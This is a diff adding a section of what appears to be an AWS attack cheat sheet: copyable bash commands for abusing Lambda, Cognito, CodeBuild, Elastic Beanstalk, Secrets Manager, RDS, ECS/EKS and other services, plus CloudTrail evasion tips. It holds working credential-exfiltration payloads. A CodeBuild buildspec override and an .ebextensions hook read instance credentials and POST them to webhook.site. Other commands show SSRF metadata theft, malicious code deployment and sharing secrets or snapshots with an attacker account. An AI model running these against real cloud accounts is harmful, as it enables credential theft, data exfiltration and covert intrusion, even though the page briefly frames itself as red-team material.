+      <span class="callout-icon">💡</span>
+      <p>When testing web apps running on EC2 or ECS, look for SSRF opportunities: URL parameters, image-fetching endpoints, webhooks, or XML parsers (XXE). If the app fetches user-supplied URLs, test with <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> to confirm SSRF and steal instance credentials.</p>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- LAMBDA -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-lambda">
+    <div class="section-header">
+      <div class="phase-icon v">λ</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--violet-hi)">Service Attack</div>
+        <h2>Lambda Attacks</h2>
+      </div>
+    </div>
+
+    <h3>Lambda Enumeration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List functions with their roles and runtimes</span>
+<span class="t-cmd">aws lambda list-functions</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Functions[].[FunctionName,Runtime,Role,Handler]'</span> \
+  <span class="t-flag">--output</span> table
+
+<span class="t-cmt"># Get environment variables (may contain secrets)</span>
+<span class="t-cmd">aws lambda get-function-configuration</span> <span class="t-flag">--function-name</span> <span class="t-val">&lt;fn&gt;</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Environment.Variables'</span>
+
+<span class="t-cmt"># Get function code URL (download source)</span>
+<span class="t-cmd">aws lambda get-function</span> <span class="t-flag">--function-name</span> <span class="t-val">&lt;fn&gt;</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Code.Location'</span> <span class="t-flag">--output</span> text
+<span class="t-cmt"># Then: wget "&lt;URL&gt;" -O function.zip && unzip function.zip</span>
+
+<span class="t-cmt"># Check resource-based policy (who can invoke it)</span>
+<span class="t-cmd">aws lambda get-policy</span> <span class="t-flag">--function-name</span> <span class="t-val">&lt;fn&gt;</span>
+
+<span class="t-cmt"># List layers (may contain dependency backdoors)</span>
+<span class="t-cmd">aws lambda list-layers</span>
+<span class="t-cmd">aws lambda list-layer-versions</span> <span class="t-flag">--layer-name</span> <span class="t-val">&lt;layer-name&gt;</span></pre></div>
+    </div>
+
+    <h3>Lambda Code Injection / Source Review</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Download and review function source code</span>
+<span class="t-var">URL</span>=$(<span class="t-cmd">aws lambda get-function</span> <span class="t-flag">--function-name</span> <span class="t-val">TargetFunction</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Code.Location'</span> <span class="t-flag">--output</span> text)
+<span class="t-cmd">curl</span> <span class="t-flag">-o</span> function.zip <span class="t-val">"$URL"</span>
+<span class="t-cmd">unzip</span> function.zip -d function-source
+<span class="t-cmt"># Review for hardcoded creds, dangerous eval(), subprocess calls, etc.</span>
+<span class="t-cmd">grep</span> <span class="t-flag">-r</span> <span class="t-val">'os.environ\|subprocess\|exec\|eval\|password\|secret\|key'</span> function-source/
+
+<span class="t-cmt"># Update function code with malicious version</span>
+<span class="t-cmd">aws lambda update-function-code</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">TargetFunction</span> \
+  <span class="t-flag">--zip-file</span> <span class="t-val">fileb://./malicious.zip</span>
+
+<span class="t-cmt"># Invoke and capture output</span>
+<span class="t-cmd">aws lambda invoke</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">TargetFunction</span> \
+  <span class="t-flag">--payload</span> <span class="t-val">'{"key":"value"}'</span> \
+  <span class="t-flag">--log-type</span> <span class="t-val">Tail</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'LogResult'</span> /tmp/out.json \
+  <span class="t-flag">--output</span> text | <span class="t-cmd">base64</span> -d</pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- COGNITO -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-cognito">
+    <div class="section-header">
+      <div class="phase-icon rs">👥</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--rose)">Service Attack</div>
+        <h2>Cognito Attacks</h2>
+      </div>
+    </div>
+
+    <p>Cognito User Pools handle authentication; Identity Pools (Federated Identities) exchange tokens for temporary AWS credentials. Misconfigurations here can grant direct AWS API access to unauthenticated or low-privilege users.</p>
+
+    <h3>Cognito User Pool Enumeration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List user pools</span>
+<span class="t-cmd">aws cognito-idp list-user-pools</span> <span class="t-flag">--max-results</span> <span class="t-val">60</span>
+
+<span class="t-cmt"># Describe pool (check for self-registration, MFA requirements)</span>
+<span class="t-cmd">aws cognito-idp describe-user-pool</span> <span class="t-flag">--user-pool-id</span> <span class="t-val">us-east-1_ABC123</span>
+
+<span class="t-cmt"># List user pool clients (contains client_id for sign-up/sign-in)</span>
+<span class="t-cmd">aws cognito-idp list-user-pool-clients</span> <span class="t-flag">--user-pool-id</span> <span class="t-val">us-east-1_ABC123</span>
+
+<span class="t-cmt"># Get client details (check if secret is required — if not, open registration)</span>
+<span class="t-cmd">aws cognito-idp describe-user-pool-client</span> \
+  <span class="t-flag">--user-pool-id</span> <span class="t-val">us-east-1_ABC123</span> \
+  <span class="t-flag">--client-id</span> <span class="t-val">1abc2defgh...</span></pre></div>
+    </div>
+
+    <h3>Identity Pool Credential Escalation</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List identity pools</span>
+<span class="t-cmd">aws cognito-identity list-identity-pools</span> <span class="t-flag">--max-results</span> <span class="t-val">60</span>
+
+<span class="t-cmt"># Describe identity pool (check if unauthenticated access is allowed)</span>
+<span class="t-cmd">aws cognito-identity describe-identity-pool</span> <span class="t-flag">--identity-pool-id</span> <span class="t-val">us-east-1:abc123...</span>
+
+<span class="t-cmt"># Get unauthenticated credentials (if AllowUnauthenticatedIdentities=true)</span>
+<span class="t-var">ID</span>=$(<span class="t-cmd">aws cognito-identity get-id</span> \
+  <span class="t-flag">--account-id</span> <span class="t-val">123456789012</span> \
+  <span class="t-flag">--identity-pool-id</span> <span class="t-val">us-east-1:abc123...</span> \
+  <span class="t-flag">--query</span> <span class="t-val">IdentityId</span> <span class="t-flag">--output</span> text)
+
+<span class="t-cmd">aws cognito-identity get-credentials-for-identity</span> \
+  <span class="t-flag">--identity-id</span> <span class="t-var">$ID</span>
+
+<span class="t-cmt"># Self-register a new user (if open registration)</span>
+<span class="t-cmd">aws cognito-idp sign-up</span> \
+  <span class="t-flag">--client-id</span> <span class="t-val">&lt;client-id&gt;</span> \
+  <span class="t-flag">--username</span> <span class="t-val">attacker@temp-mail.com</span> \
+  <span class="t-flag">--password</span> <span class="t-val">'P@ssw0rd1234!'</span>
+
+<span class="t-cmt"># Authenticate and get tokens</span>
+<span class="t-cmd">aws cognito-idp initiate-auth</span> \
+  <span class="t-flag">--auth-flow</span> <span class="t-val">USER_PASSWORD_AUTH</span> \
+  <span class="t-flag">--client-id</span> <span class="t-val">&lt;client-id&gt;</span> \
+  <span class="t-flag">--auth-parameters</span> <span class="t-val">USERNAME=attacker@temp-mail.com,PASSWORD=P@ssw0rd1234!</span>
+
+<span class="t-cmt"># Exchange Cognito token for AWS credentials</span>
+<span class="t-var">TOKEN</span>=<span class="t-val">&lt;IdToken from above&gt;</span>
+<span class="t-var">USER_POOL_URL</span>=<span class="t-val">cognito-idp.us-east-1.amazonaws.com/us-east-1_POOLID</span>
+
+<span class="t-var">ID</span>=$(<span class="t-cmd">aws cognito-identity get-id</span> \
+  <span class="t-flag">--account-id</span> <span class="t-val">123456789012</span> \
+  <span class="t-flag">--identity-pool-id</span> <span class="t-val">us-east-1:abc123...</span> \
+  <span class="t-flag">--logins</span> <span class="t-val">"$USER_POOL_URL=$TOKEN"</span> \
+  <span class="t-flag">--query</span> <span class="t-val">IdentityId</span> <span class="t-flag">--output</span> text)
+
+<span class="t-cmd">aws cognito-identity get-credentials-for-identity</span> \
+  <span class="t-flag">--identity-id</span> <span class="t-var">$ID</span> \
+  <span class="t-flag">--logins</span> <span class="t-val">"$USER_POOL_URL=$TOKEN"</span></pre></div>
+    </div>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠️</span>
+      <p><strong>Common Misconfig:</strong> Identity Pool roles are often misconfigured with overly permissive IAM policies (even <code>AdministratorAccess</code>). Always test both authenticated and unauthenticated credential retrieval, and check the IAM roles attached to the pool.</p>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- CODEBUILD -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-codebuild">
+    <div class="section-header">
+      <div class="phase-icon g">🔨</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--green)">Service Attack</div>
+        <h2>CodeBuild Attacks</h2>
+      </div>
+    </div>
+
+    <p>CodeBuild executes build commands in a container with an attached IAM service role. If you can modify build specs or trigger builds, you can execute arbitrary code with that role's permissions and exfiltrate its credentials.</p>
+
+    <h3>CodeBuild Credential Extraction</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List projects and their service roles</span>
+<span class="t-cmd">aws codebuild list-projects</span>
+<span class="t-cmd">aws codebuild batch-get-projects</span> <span class="t-flag">--names</span> <span class="t-val">ProjectName</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'projects[].[name,serviceRole,environment.type]'</span>
+
+<span class="t-cmt"># Start build with malicious buildspec override to exfil creds</span>
+<span class="t-cmd">aws codebuild start-build</span> \
+  <span class="t-flag">--project-name</span> <span class="t-val">TargetProject</span> \
+  <span class="t-flag">--buildspec-override</span> <span class="t-val">'version: 0.2
+phases:
+  build:
+    commands:
+      - curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > /tmp/creds.json
+      - curl -X POST https://webhook.site/YOUR-UUID -d @/tmp/creds.json
+      - env | curl -X POST https://webhook.site/YOUR-UUID -d @-'</span>
+
+<span class="t-cmt"># Start build with source override (inject code from your repo)</span>
+<span class="t-cmd">aws codebuild start-build</span> \
+  <span class="t-flag">--project-name</span> <span class="t-val">TargetProject</span> \
+  <span class="t-flag">--source-version</span> <span class="t-val">main</span> \
+  <span class="t-flag">--source-type-override</span> <span class="t-val">GITHUB</span> \
+  <span class="t-flag">--source-location-override</span> <span class="t-val">https://github.com/attacker/malicious-repo</span>
+
+<span class="t-cmt"># Monitor build status</span>
+<span class="t-cmd">aws codebuild batch-get-builds</span> <span class="t-flag">--ids</span> <span class="t-val">TargetProject:&lt;build-id&gt;</span>
+
+<span class="t-cmt"># Credentials in CodeBuild containers come from:</span>
+<span class="t-cmt"># 1. AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var → http://169.254.170.2&lt;path&gt;</span>
+<span class="t-cmt"># 2. Direct env vars: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- ELASTIC BEANSTALK -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-beanstalk">
+    <div class="section-header">
+      <div class="phase-icon a">🫘</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--amber)">Service Attack</div>
+        <h2>Elastic Beanstalk Supply Chain</h2>
+      </div>
+    </div>
+
+    <p>Elastic Beanstalk deploys application code to managed EC2/ECS environments. A supply chain attack involves uploading a malicious application version that executes arbitrary code in the environment, allowing credential theft from the EC2 instance profile.</p>
+
+    <h3>Beanstalk Application Attack Chain</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Enumerate Beanstalk environments and their platforms</span>
+<span class="t-cmd">aws elasticbeanstalk describe-environments</span>
+<span class="t-cmd">aws elasticbeanstalk describe-environments</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Environments[].[EnvironmentName,PlatformArn,CNAME,SolutionStackName]'</span> \
+  <span class="t-flag">--output</span> table
+
+<span class="t-cmt"># Get environment configuration (find instance profile role)</span>
+<span class="t-cmd">aws elasticbeanstalk describe-configuration-settings</span> \
+  <span class="t-flag">--application-name</span> <span class="t-val">MyApp</span> \
+  <span class="t-flag">--environment-name</span> <span class="t-val">MyApp-env</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.ConfigurationSettings[].OptionSettings[] |
+    select(.OptionName == "IamInstanceProfile" or .OptionName == "ServiceRole")'</span>
+
+<span class="t-cmt"># Create a malicious .ebextensions hook (Python example)</span>
+<span class="t-cmd">mkdir</span> -p malicious-app/.ebextensions
+<span class="t-cmd">cat</span> > malicious-app/.ebextensions/exfil.config &lt;&lt; <span class="t-val">'EOF'</span>
+container_commands:
+  01_exfil:
+    command: |
+      ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
+      curl -X POST https://webhook.site/YOUR-UUID \
+        -H 'Content-Type: application/json' \
+        -d "$CREDS"
+<span class="t-val">EOF</span>
+
+<span class="t-cmt"># Add a simple app file</span>
+<span class="t-cmd">echo</span> <span class="t-val">"Hello"</span> > malicious-app/index.html
+
+<span class="t-cmt"># Package and upload to S3</span>
+<span class="t-cmd">cd</span> malicious-app && <span class="t-cmd">zip</span> -r ../malicious.zip .
+<span class="t-cmd">aws s3 cp</span> malicious.zip <span class="t-val">s3://elasticbeanstalk-us-east-1-123456789012/malicious.zip</span>
+
+<span class="t-cmt"># Create application version pointing to malicious bundle</span>
+<span class="t-cmd">aws elasticbeanstalk create-application-version</span> \
+  <span class="t-flag">--application-name</span> <span class="t-val">MyApp</span> \
+  <span class="t-flag">--version-label</span> <span class="t-val">v-malicious</span> \
+  <span class="t-flag">--source-bundle</span> <span class="t-val">S3Bucket=elasticbeanstalk-us-east-1-123456789012,S3Key=malicious.zip</span>
+
+<span class="t-cmt"># Deploy to environment</span>
+<span class="t-cmd">aws elasticbeanstalk update-environment</span> \
+  <span class="t-flag">--environment-name</span> <span class="t-val">MyApp-env</span> \
+  <span class="t-flag">--version-label</span> <span class="t-val">v-malicious</span>
+
+<span class="t-cmt"># Monitor deployment status</span>
+<span class="t-cmd">aws elasticbeanstalk describe-environments</span> \
+  <span class="t-flag">--environment-names</span> <span class="t-val">MyApp-env</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Environments[0].Status'</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- STEP FUNCTIONS -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-stepfn">
+    <div class="section-header">
+      <div class="phase-icon v">⚙️</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--violet-hi)">Service Attack</div>
+        <h2>Step Functions</h2>
+      </div>
+    </div>
+
+    <h3>Step Functions Enumeration &amp; Exploitation</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List state machines</span>
+<span class="t-cmd">aws stepfunctions list-state-machines</span>
+
+<span class="t-cmt"># Describe state machine (find execution role and invoked services)</span>
+<span class="t-cmd">aws stepfunctions describe-state-machine</span> \
+  <span class="t-flag">--state-machine-arn</span> <span class="t-val">arn:aws:states:us-east-1:123456789012:stateMachine:MyMachine</span>
+
+<span class="t-cmt"># Start execution (test what runs as the execution role)</span>
+<span class="t-cmd">aws stepfunctions start-execution</span> \
+  <span class="t-flag">--state-machine-arn</span> <span class="t-val">arn:aws:states:us-east-1:123456789012:stateMachine:MyMachine</span> \
+  <span class="t-flag">--input</span> <span class="t-val">'{"key":"value"}'</span>
+
+<span class="t-cmt"># List executions and their status</span>
+<span class="t-cmd">aws stepfunctions list-executions</span> \
+  <span class="t-flag">--state-machine-arn</span> <span class="t-val">arn:aws:states:us-east-1:123456789012:stateMachine:MyMachine</span>
+
+<span class="t-cmt"># Get execution history (reveals what each step did, useful for understanding flow)</span>
+<span class="t-cmd">aws stepfunctions get-execution-history</span> \
+  <span class="t-flag">--execution-arn</span> <span class="t-val">&lt;execution-arn&gt;</span>
+
+<span class="t-cmt"># Abuse: if Step Functions invokes Lambda — and you can modify Lambda code —
+# trigger execution to run your code under the Step Functions' role</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- EVENTBRIDGE -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-eventbridge">
+    <div class="section-header">
+      <div class="phase-icon r">📅</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--red)">Service Attack</div>
+        <h2>EventBridge / Scheduler</h2>
+      </div>
+    </div>
+
+    <h3>EventBridge Rules — Trigger-Based Code Execution</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List EventBridge rules</span>
+<span class="t-cmd">aws events list-rules</span>
+<span class="t-cmd">aws events describe-rule</span> <span class="t-flag">--name</span> <span class="t-val">RuleName</span>
+<span class="t-cmd">aws events list-targets-by-rule</span> <span class="t-flag">--rule</span> <span class="t-val">RuleName</span>
+
+<span class="t-cmt"># Create a rule that triggers your Lambda (if you have events:PutRule + events:PutTargets)</span>
+<span class="t-cmd">aws events put-rule</span> \
+  <span class="t-flag">--name</span> <span class="t-val">AttackRule</span> \
+  <span class="t-flag">--schedule-expression</span> <span class="t-val">'rate(1 minute)'</span> \
+  <span class="t-flag">--state</span> <span class="t-val">ENABLED</span>
+
+<span class="t-cmd">aws events put-targets</span> \
+  <span class="t-flag">--rule</span> <span class="t-val">AttackRule</span> \
+  <span class="t-flag">--targets</span> <span class="t-val">'[{"Id":"1","Arn":"arn:aws:lambda:us-east-1:123456789012:function:MyFn"}]'</span>
+
+<span class="t-cmt"># EventBridge Scheduler (newer, more powerful)</span>
+<span class="t-cmd">aws scheduler list-schedules</span>
+<span class="t-cmd">aws scheduler get-schedule</span> <span class="t-flag">--name</span> <span class="t-val">ScheduleName</span>
+
+<span class="t-cmt"># Scheduler privilege escalation:
+# Create schedule that invokes Lambda with high-priv role,
+# Lambda modifies IAM to grant our user admin access</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- SECRETS MANAGER -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-secrets">
+    <div class="section-header">
+      <div class="phase-icon g">🗝️</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--green)">Service Attack</div>
+        <h2>Secrets Manager</h2>
+      </div>
+    </div>
+
+    <h3>Secrets Discovery &amp; Resource Policy Abuse</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List all secrets with metadata</span>
+<span class="t-cmd">aws secretsmanager list-secrets</span>
+<span class="t-cmd">aws secretsmanager list-secrets</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'SecretList[].[Name,Description,LastChangedDate,Tags]'</span> \
+  <span class="t-flag">--output</span> table
+
+<span class="t-cmt"># Get secret value</span>
+<span class="t-cmd">aws secretsmanager get-secret-value</span> <span class="t-flag">--secret-id</span> <span class="t-val">prod/db/credentials</span>
+
+<span class="t-cmt"># Get resource-based policy (may allow cross-account access)</span>
+<span class="t-cmd">aws secretsmanager get-resource-policy</span> <span class="t-flag">--secret-id</span> <span class="t-val">SecretName</span>
+
+<span class="t-cmt"># Modify resource policy to grant attacker access (if secretsmanager:PutResourcePolicy allowed)</span>
+<span class="t-cmd">aws secretsmanager put-resource-policy</span> \
+  <span class="t-flag">--secret-id</span> <span class="t-val">SecretName</span> \
+  <span class="t-flag">--resource-policy</span> <span class="t-val">'{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
+      "Action": "secretsmanager:GetSecretValue",
+      "Resource": "*"
+    }]
+  }'</span>
+
+<span class="t-cmt"># List previous secret versions (rotation history)</span>
+<span class="t-cmd">aws secretsmanager list-secret-version-ids</span> <span class="t-flag">--secret-id</span> <span class="t-val">SecretName</span>
+<span class="t-cmd">aws secretsmanager get-secret-value</span> \
+  <span class="t-flag">--secret-id</span> <span class="t-val">SecretName</span> \
+  <span class="t-flag">--version-stage</span> <span class="t-val">AWSPREVIOUS</span>   <span class="t-cmt"># previous version!</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- RDS -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-rds">
+    <div class="section-header">
+      <div class="phase-icon c">🗄️</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--cyan)">Service Attack</div>
+        <h2>RDS Attacks</h2>
+      </div>
+    </div>
+
+    <h3>RDS Enumeration &amp; Snapshot Exfiltration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Enumerate RDS instances</span>
+<span class="t-cmd">aws rds describe-db-instances</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'DBInstances[].[DBInstanceIdentifier,Engine,Endpoint.Address,PubliclyAccessible,MasterUsername]'</span> \
+  <span class="t-flag">--output</span> table
+
+<span class="t-cmt"># Check if instance is publicly accessible (critical finding)</span>
+<span class="t-cmd">aws rds describe-db-instances</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address]'</span>
+
+<span class="t-cmt"># List snapshots (may be shared publicly!)</span>
+<span class="t-cmd">aws rds describe-db-snapshots</span>
+<span class="t-cmd">aws rds describe-db-snapshots</span> <span class="t-flag">--snapshot-type</span> <span class="t-val">public</span>
+
+<span class="t-cmt"># CRITICAL: Copy a production snapshot to attacker account and restore it</span>
+<span class="t-cmd">aws rds copy-db-snapshot</span> \
+  <span class="t-flag">--source-db-snapshot-identifier</span> <span class="t-val">arn:aws:rds:us-east-1:123456789012:snapshot:prod-snap</span> \
+  <span class="t-flag">--target-db-snapshot-identifier</span> <span class="t-val">stolen-copy</span>
+
+<span class="t-cmt"># Share snapshot with attacker account</span>
+<span class="t-cmd">aws rds modify-db-snapshot-attribute</span> \
+  <span class="t-flag">--db-snapshot-identifier</span> <span class="t-val">prod-snap</span> \
+  <span class="t-flag">--attribute-name</span> <span class="t-val">restore</span> \
+  <span class="t-flag">--values-to-add</span> <span class="t-val">ATTACKER_ACCOUNT_ID</span>
+
+<span class="t-cmt"># RDS IAM Authentication — if enabled, token can be used as DB password</span>
+<span class="t-cmd">aws rds generate-db-auth-token</span> \
+  <span class="t-flag">--hostname</span> <span class="t-val">mydb.cluster-xyz.us-east-1.rds.amazonaws.com</span> \
+  <span class="t-flag">--port</span> <span class="t-val">5432</span> \
+  <span class="t-flag">--region</span> <span class="t-val">us-east-1</span> \
+  <span class="t-flag">--username</span> <span class="t-val">iam_user</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- ECS / EKS -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-ecs-eks">
+    <div class="section-header">
+      <div class="phase-icon a">🐳</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--amber)">Service Attack</div>
+        <h2>ECS / EKS Container Attacks</h2>
+      </div>
+    </div>
+
+    <h3>ECS Task Credential Theft</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># From within an ECS task — retrieve task role credentials</span>
+<span class="t-cmt"># AWS_CONTAINER_CREDENTIALS_RELATIVE_URI is set automatically</span>
+<span class="t-cmd">curl</span> http://169.254.170.2<span class="t-var">$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</span>
+
+<span class="t-cmt"># ECS Exec — if configured, get a shell inside running container</span>
+<span class="t-cmd">aws ecs execute-command</span> \
+  <span class="t-flag">--cluster</span> <span class="t-val">my-cluster</span> \
+  <span class="t-flag">--task</span> <span class="t-val">&lt;task-arn&gt;</span> \
+  <span class="t-flag">--container</span> <span class="t-val">my-container</span> \
+  <span class="t-flag">--command</span> <span class="t-val">"/bin/sh"</span> \
+  <span class="t-flag">--interactive</span>
+
+<span class="t-cmt"># Check if ECS Exec is enabled on a task</span>
+<span class="t-cmd">aws ecs describe-tasks</span> \
+  <span class="t-flag">--cluster</span> <span class="t-val">my-cluster</span> \
+  <span class="t-flag">--tasks</span> <span class="t-val">&lt;task-arn&gt;</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'tasks[0].enableExecuteCommand'</span></pre></div>
+    </div>
+
+    <h3>EKS Attacks</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List EKS clusters</span>
+<span class="t-cmd">aws eks list-clusters</span>
+<span class="t-cmd">aws eks describe-cluster</span> <span class="t-flag">--name</span> <span class="t-val">my-cluster</span>
+
+<span class="t-cmt"># Check if public API server endpoint is enabled</span>
+<span class="t-cmd">aws eks describe-cluster</span> <span class="t-flag">--name</span> <span class="t-val">my-cluster</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'cluster.resourcesVpcConfig.[endpointPublicAccess,endpointPrivateAccess,publicAccessCidrs]'</span>
+
+<span class="t-cmt"># Get kubeconfig (uses your AWS creds to auth to k8s API)</span>
+<span class="t-cmd">aws eks update-kubeconfig</span> <span class="t-flag">--name</span> <span class="t-val">my-cluster</span>
+
+<span class="t-cmt"># Now use kubectl — your AWS IAM identity maps to k8s RBAC</span>
+<span class="t-cmd">kubectl auth can-i</span> <span class="t-val">--list</span>
+<span class="t-cmd">kubectl get pods</span> <span class="t-flag">-A</span>
+<span class="t-cmd">kubectl get secrets</span> <span class="t-flag">-A</span>   <span class="t-cmt"># may contain service account tokens</span>
+
+<span class="t-cmt"># IRSA (IAM Roles for Service Accounts) — check annotations</span>
+<span class="t-cmd">kubectl get serviceaccounts</span> <span class="t-flag">-A</span> <span class="t-flag">-o</span> yaml | <span class="t-cmd">grep</span> <span class="t-val">-A5</span> <span class="t-val">annotations</span>
+
+<span class="t-cmt"># Check aws-auth ConfigMap (maps IAM roles/users to k8s groups)</span>
+<span class="t-cmd">kubectl get configmap aws-auth</span> <span class="t-flag">-n</span> kube-system <span class="t-flag">-o</span> yaml</pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- DEFENSE EVASION -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="evasion">
+    <div class="section-header">
+      <div class="phase-icon gr">🥷</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--text-3)">Advanced</div>
+        <h2>Defense Evasion</h2>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠️</span>
+      <p>These techniques reduce detection probability during authorized red team engagements. Understand them to improve detection coverage and write better findings recommendations.</p>
+    </div>
+
+    <h3>Reducing CloudTrail Noise</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Use GetSessionToken with existing creds to get new STS creds
+# (hides direct key usage in some trail configurations)</span>
+<span class="t-cmd">aws sts get-session-token</span>
+
+<span class="t-cmt"># Assume role through a chain of accounts to obscure origin</span>
+<span class="t-cmt"># Account A → assume role in B → assume role in C → target</span>
+
+<span class="t-cmt"># Use VPC Endpoints to avoid API calls going through public internet</span>
+<span class="t-cmt"># (some orgs monitor internet-facing calls more closely)</span>
+
+<span class="t-cmt"># Operate in non-primary regions (CloudTrail may only cover us-east-1)</span>
+<span class="t-cmd">aws ec2 describe-instances</span> <span class="t-flag">--region</span> <span class="t-val">ap-southeast-2</span>
+
+<span class="t-cmt"># Use services not typically monitored (Elastic Transcoder, Glacier, etc.)
+# as staging areas for data</span>
+
+<span class="t-cmt"># Stop CloudTrail (requires cloudtrail:StopLogging — noisy itself!)</span>
